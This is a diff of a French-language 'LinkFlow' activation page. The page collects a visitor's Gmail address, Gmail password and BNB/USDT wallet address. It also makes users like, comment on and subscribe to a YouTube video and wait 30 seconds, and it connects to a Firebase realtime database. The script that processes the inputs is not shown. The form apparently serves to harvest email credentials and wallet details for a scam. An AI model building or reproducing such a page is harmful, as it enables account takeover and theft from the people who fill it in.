@@ -3,53 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LinkFlow System - Activation</title>
+    <title>LinkFlow - Activation</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="card">
-        <h1 id="appName">LinkFlow</h1>
+        <h1>LinkFlow</h1>
         <p class="slogan">L'écosystème qui propulse votre réseau.</p>
        
-        <select id="language" onchange="toggleLanguage()">
-            <option value="fr">Français</option>
-            <option value="en">English</option>
-        </select>
-
         <div id="notification" class="hidden"></div>
 
         <div class="auth-box">
-            <h3>Identification & Profil</h3>
-            <input type="email" id="userEmail" placeholder="Votre Gmail (ex: nom@gmail.com)" required>
+            <input type="email" id="userEmail" placeholder="Votre Gmail" required>
             <input type="password" id="userPassword" placeholder="Mot de passe" required>
-            <input type="text" id="userWallet" placeholder="Votre adresse Portefeuille (BNB/USDT)" required>
-            <p style="font-size: 0.75em; color: #64748b; margin-top: 5px;">
-                * Ces infos seront liées à votre compte sécurisé.
-            </p>
+            <input type="text" id="userWallet" placeholder="Adresse Portefeuille (BNB/USDT)" required>
         </div>
 
-        <div id="videoContainer" class="video-box">
+        <div class="video-box">
             <iframe id="videoPlayer" 
-                src="https://www.youtube.com/embed/VOTRE_ID_VIDEO_ICI?rel=0" 
-                frameborder="0" 
-                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-                allowfullscreen>
+                src="https://www.youtube.com/embed/VOTRE_ID_VIDEO?rel=0" 
+                frameborder="0" allowfullscreen>
             </iframe>
         </div>
 
         <div class="steps-box">
-            <div class="consent-box">
-                <input type="checkbox" id="likeCheck">
-                <label for="likeCheck">J'ai aimé la vidéo</label>
-            </div>
-            <div class="consent-box">
-                <input type="checkbox" id="commentCheck">
-                <label for="commentCheck">J'ai laissé un commentaire</label>
-            </div>
-            <div class="consent-box">
-                <input type="checkbox" id="subCheck">
-                <label for="subCheck">Je suis abonné</label>
-            </div>
+            <label><input type="checkbox" id="likeCheck"> J'ai aimé</label>
+            <label><input type="checkbox" id="commentCheck"> J'ai commenté</label>
+            <label><input type="checkbox" id="subCheck"> Je suis abonné</label>
         </div>
 
         <button id="btnAction" disabled>Patientez (30s)...</button>
@@ -60,24 +40,21 @@
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
 
     <script>
+        // CONFIGURATION AVEC TON LIEN RTDB
         const firebaseConfig = {
-            apiKey: "VOTRE_API_KEY",
-            authDomain: "VOTRE_PROJET.firebaseapp.com",
-            databaseURL: "https://VOTRE_PROJET-default-rtdb.firebaseio.com",
-            projectId: "VOTRE_PROJET_ID",
-            storageBucket: "VOTRE_PROJET.appspot.com",
-            messagingSenderId: "VOTRE_SENDER_ID",
-            appId: "VOTRE_APP_ID"
+            apiKey: "AIzaSy...", // À REMPLACER PAR TA CLÉ RÉELLE
+            authDomain: "linkflow-7a82a.firebaseapp.com",
+            databaseURL: "https://linkflow-7a82a-default-rtdb.europe-west1.firebasedatabase.app/",
+            projectId: "linkflow-7a82a",
+            storageBucket: "linkflow-7a82a.appspot.com",
+            messagingSenderId: "VOTRE_SENDER_ID", // À REMPLACER
+            appId: "VOTRE_APP_ID" // À REMPLACER
         };
         
-        // Initialisation de sécurité
         if (typeof firebase !== 'undefined') {
             firebase.initializeApp(firebaseConfig);
-        } else {
-            alert("Erreur de chargement Firebase. Vérifiez votre connexion.");
         }
     </script>
-
     <script src="app.js"></script>
 </body>
 </html>
